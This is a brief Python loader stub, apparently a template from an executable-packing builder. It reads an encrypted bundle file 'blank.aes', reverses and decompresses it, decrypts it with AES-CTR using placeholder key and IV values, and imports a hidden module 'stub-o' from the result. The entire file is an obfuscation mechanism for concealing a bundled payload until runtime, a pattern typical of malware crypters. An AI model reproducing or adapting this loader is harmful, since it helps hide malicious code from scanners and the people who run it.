import os, sys, base64, zlib
from pyaes import AESModeOfOperationCTR
from zipimport import zipimporter

zipfile = os.path.join(sys._MEIPASS, "blank.aes")
module = "stub-o"

def fix_base64_padding(data):
    while len(data) % 4 != 0:
        data += "="
    return data

key = base64.b64decode(fix_base64_padding("%key%"))
iv = base64.b64decode(fix_base64_padding("%iv%"))

def decrypt(key, ciphertext):
    aes = AESModeOfOperationCTR(key)
    return aes.decrypt(ciphertext)

if os.path.isfile(zipfile):
    with open(zipfile, "rb") as f:
        ciphertext = f.read()
    ciphertext = zlib.decompress(ciphertext[::-1])
    decrypted = decrypt(key, ciphertext)
    with open(zipfile, "wb") as f:
        f.write(decrypted)
    
    zipimporter(zipfile).load_module(module)
